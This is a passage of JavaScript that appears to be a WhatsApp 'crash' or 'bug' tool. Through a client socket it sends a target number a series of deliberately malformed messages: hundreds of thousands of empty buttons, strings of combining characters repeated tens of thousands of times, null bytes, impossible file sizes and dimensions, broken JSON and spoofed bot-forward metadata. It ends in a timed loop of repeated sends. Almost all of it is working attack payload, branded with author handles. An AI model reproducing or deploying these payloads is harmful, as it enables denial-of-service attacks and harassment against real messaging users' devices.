              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: {
            text: "Iniochamy - Executed¿!"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const Lexca = generateWAMessageFromContent(target, LexMsg, {});

  await sock.relayMessage(target, Lexca.message, {
    participant: true,
    messageId: Lexca.key.id
  });

  const Lexcaa = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Lexcaabos - Executed¿!"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});

  await sock.relayMessage(target, Lexcaabos.message, {
    participant: true,
    messageId: Lexcaabos.key.id
  });

  const msg = {
    key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
    message: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        caption: "iniochamy¿!",
        fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        fileLength: 9999999,
        height: 9999,
        width: 9999,
        mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
        fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1776937541",
        jpegThumbnail: largeThumbnail,
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
        contextInfo: {
          pairedMediaType: "RICH_TEXT_MESSAGE",
          isQuestion: true,
          isGroupStatus: false,
          remoteJid: "1234567890-987654321@g.us",
          entryPointConversionDelaySeconds: 120,
          entryPointConversionSource: "group_chat"
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    statusJidList: [target],
    messageId: msg.key.id,
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          type: 25
        },
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "false" },
          content: undefined
        }]
      }
    }
  }, {});

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          type: 25
        }
      }
    }
  }, {});

  const a = {
    interactiveMessage: {
      header: {
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgARQMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAQQFBgIBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA5kE3aIuxTAAAE7mf2xg4/ZZZyiYAAL3UcZ0M1p505aZsFgACxXGln+QAAAAAAB//xAAkEAACAgIBBAEFAAAAAAAAAAABAgADBBExBRMgIhASMDJAcf/aAAgBAQABPwD4HI3O9Q35JO7Rxo6lltBr0qnf3wNnUxuks6B3jdMrA4mViNR/PLAQWZVYMLBdDYlzBRMtBZQ8Pj046y652Vstsdt7UjUzFLgCfSKsWw7h58a3Nbqw5BleXYxays+pHtLstiuww3L7WWoqW2zedGS9BOuDyJZmoy+tYDRmLHZ/W//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABcRAAMBAAAAAAAAAAAAAAAAAAAwQQH/2gAIAQMBAT8AXlI3/9k=",
        hasMediaAttachment: true
      },
      body: {},
      nativeFlowMessage: {
        buttons: [
          {
            name: "order_status",
            buttonParamsJson: `{
  \"currency\":\"IDR\",
  \"total_amount\":{\"value\":0,\"offset\":100},
  \"reference_id\":\"${"NanasPrivate" + "ြ".repeat(75000)}\",
  \"type\":\"physical-goods\",
  \"order\":{
    \"status\":\"pending\",
    \"order_type\":\"PAYMENT_REQUEST\",
    \"items\":[
      {
        \"name\":\"${"LexzyMods" + "ြ".repeat(75000)}\",
        \"quantity\":-9,
        \"price\":{\"value\":0,\"offset\":100}
      }
    ]
  }
}`
          }
        ],
        messageParamsJson: ""
      },
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        pairedMediaType: "NOT_PAIRED_MEDIA"
      }
    }
  };

  await sock.relayMessage(target, a, {});

  const b = {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(75000),
      publisher: "iniochamy - Executed¿!" + "ꦾ".repeat(5000),
      stickers: [],
      fileLength: "366299919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: ["13135555555@s.whatsapp.net"]
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 999999999,
      thumbnailWidth: 9999999999,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "9990099",
      stickerPackOrigin: "USER_CREATED"
    }
  };

  await sock.relayMessage(target, b, {});

  const c = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Students Func Nanas",
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.9999999999999,
              name: "LexzyMods",
              address: "X",
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "LexzyMods - Executed¿!",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ြ ".repeat(9000),
              },
              {
                name: "address_message",
                buttonParamsJson: "ြ ".repeat(9000),
              },
              {
                name: "galaxy_message",
                buttonParamsJson: "ြ ".repeat(75000),
              },
            ],
            messageParamsJson: "wa.me/stickerpack/LexzyMods",
            messageVersion: 1,
          },
        },
      },
    },
  };

  await sock.relayMessage(target, c, {});

  const d = {
    groupStatusMessageV2: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          caption: "LexzyMods - Executed¿!",
          fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
          fileLength: "1099511627776",
          seconds: 172800,
          mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
          height: 1080,
          width: 1920,
          fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
          directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1774428565",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIQQQIgQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
          annotations: [
            {
              polygonVertices: [
                {
                  x: 0.17499999701976776,
                  y: 0.3379453122615814
                },
                {
                  x: 0.824999988079071,
                  y: 0.3379453122615814
                },
                {
                  x: 0.824999988079071,
                  y: 0.6620468497276306
                },
                {
                  x: 0.17499999701976776,
                  y: 0.6620468497276306
                }
              ],
              shouldSkipConfirmation: true,
              embeddedContent: {
                embeddedMusic: {
                  musicContentMediaId: "2261401457948346",
                  songId: "849859527815275",
                  author: "Lexcaabos - Executed¿!" + "ြ".repeat(9000),
                  title: "ြ".repeat(75000),
                  artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                  artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                  artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                  artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                  artistAttribution: "https://www.instagram.com/_u/lexzymods",
                  countryBlocklist: "WEs=",
                  isExplicit: false
                }
              },
              embeddedAction: true
            }
          ]
        }
      }
    }
  };

  await sock.relayMessage(target, d, {});

  const bot = "867051314767696@bot";

  const e = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,

          submessages: [
            {
              messageType: 2,
              messageText: `@${bot.split("@")[0]}`
            },

            {
              messageType: 5,
              codeMetadata: {
                codeLanguage: "javascript",

                codeBlocks: [
                  {
                    highlightType: 1,
                    codeContent: "const = {"
                  },
                  {
                    highlightType: 2,
                    codeContent: "Lexcaabos - Executed¿!"
                  },
                  {
                    highlightType: 3,
                    codeContent: `${"\0".repeat(75000)}` + `${"\x10".repeat(25000)}`
                  }
                ]
              }
            }
          ],

          contextInfo: {
            mentionedJid: [bot],

            featureEligibilities: Array.from(
              { length: 1999 },
              () => ({
                canReceiveMultiReact: true
              })
            ),

            isForwarded: true,

            forwardedAiBotMessageInfo: {
              botJid: bot
            },

            forwardOrigin: 4
          }
        }
      }
    }
  };

  await sock.relayMessage(target, e, {});

  const g = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: 9999,
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "LexzyMods - Executed¿!",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999987899999999999999,
                998999999999999999999,
                999899999999999999999,
                9998789999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: {
            text: "Lexcaabos - Executed¿!",
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 450000 }, () => ({}))
          }
        }
      }
    }
  };

  const gMsg = generateWAMessageFromContent(target, g, {});

  await sock.relayMessage(target, gMsg.message, {
    participant: true,
    messageId: gMsg.key.id
  });

  const f = {
    newsletterAdminInviteMessage: {
      newsletterJid: "228773882@newsletter",
      newsletterName: "NanasMuda" + "ြ".repeat(75000),
      caption: "Pt Func Tergacorr" + "ြ".repeat(50000),
      inviteExpiration: Date.now() + 1814400000,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
            ],
            remoteJid: "X",
            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Lexzy Ganteng"
              }
            }
      },
    },
  };

  await sock.relayMessage(target, f, {
    participant: true,
  });

  const tombol = [
      {
          name: "single_select",
          buttonParamsJson: "ြ ".repeat(9000),
      },
  ];
      tombol.push(
          {
              name: "cta_call",
              buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
              }),
          },
          {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
              }),
          },
          {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
              }),
          }
      );

  const i = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
            hasMediaAttachment: true,
          },
          body: {
            text: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
          },
          footer: {
            text: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
          },
          nativeFlowMessage: {
            buttons: tombol
          },
          contextInfo: {
            forwardingScore: 2147483647,
            isForwarded: true,
            isSampled: true,
            expireAt: 253402300799000,
            participant: target,
            remoteJid: "status@broadcast",
            stanzaId: "ြ".repeat(10000),
            deviceListMetadata: {
              senderKeyHash: "ြ".repeat(7000),
              senderTimestamp: "9999999999999",
              recipientKeyHash: "ြ".repeat(6000),
              recipientTimestamp: "8888888888888",
              userIdentity: "ြ".repeat(4000)
            },
            botInvocationMetadata: {
              botId: "exploit_bot@",
              invocationType: "BOT_INVOCATION_TYPE_QUERY",
              invocationSource: "BOT_INVOCATION_SOURCE_QUICK_REPLY",
              botMessageSecret: "ြ".repeat(4000)
            },
            quotedMessage: {
              extendedTextMessage: {
                text: "\x10".repeat(1000),
                contextInfo: {
                  forwardingScore: 999999,
                  isForwarded: true,
                  stanzaId: "ꦽ".repeat(10000),
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  deviceListMetadata: {
                    senderKeyHash: "ꦽ".repeat(1000),
                    recipientKeyHash: "ꦽ".repeat(1000)
                  }
                }
              }
            },
            conversionSource: "ꦽ".repeat(9000),
            conversionData: Buffer.from("ꦽ".repeat(1000)),
            conversionDelaySeconds: 2147483647,
            externalAdReply: {
              title: "ꦽ".repeat(2000),
              body: "ꦽ".repeat(2000),
              mediaType: "IMAGE",
              thumbnailUrl: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ/0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7yNpExH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
              mediaUrl: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
              sourceUrl: "t.me/LexzyModss",
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, i, {
    participant: true,
    messageId: generateId()
  });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mimetype: "image/jpeg",
              caption: "LexzyMods - Executed¿!",
              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
              fileLength: "634893",
              height: 1022,
              width: 1080,
              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mediaKeyTimestamp: "1782643133",
              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
              hasMediaAttachment: true
            }
          },
          body: {
            text: "\u0000",
          },
          nativeFlowMessage: {
            buttons: "[".repeat(7500),
          }
        }
      }
    }
  }, { participant: true })

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mimetype: "image/jpeg",
              caption: "iniochamy - Executed¿!",
              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
              fileLength: "634893",
              height: 1022,
              width: 1080,
              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mediaKeyTimestamp: "1782643133",
              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
              hasMediaAttachment: true
            }
          },
          body: {
            text: "\u200B",
          },
          nativeFlowMessage: {
            buttons: "]".repeat(9000),
          }
        }
      }
    }
  }, { participant: true })

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mimetype: "image/jpeg",
              caption: "ochalex - Executed¿!",
              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
              fileLength: "634893",
              height: 1022,
              width: 1080,
              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mediaKeyTimestamp: "1782643133",
              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
              hasMediaAttachment: true
            }
          },
          body: {
            text: "\uFFFC",
          },
          nativeFlowMessage: {
            buttons: "{}".repeat(7500),
          }
        }
      }
    }
  }, { participant: true })

  const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
                mimetype: "image/jpeg",
                caption: "LexzyMods - Iniochamy¿!",
                fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
                fileLength: "634893",
                height: 1022,
                width: 1080,
                mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
                fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
                directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
                mediaKeyTimestamp: "1782643133",
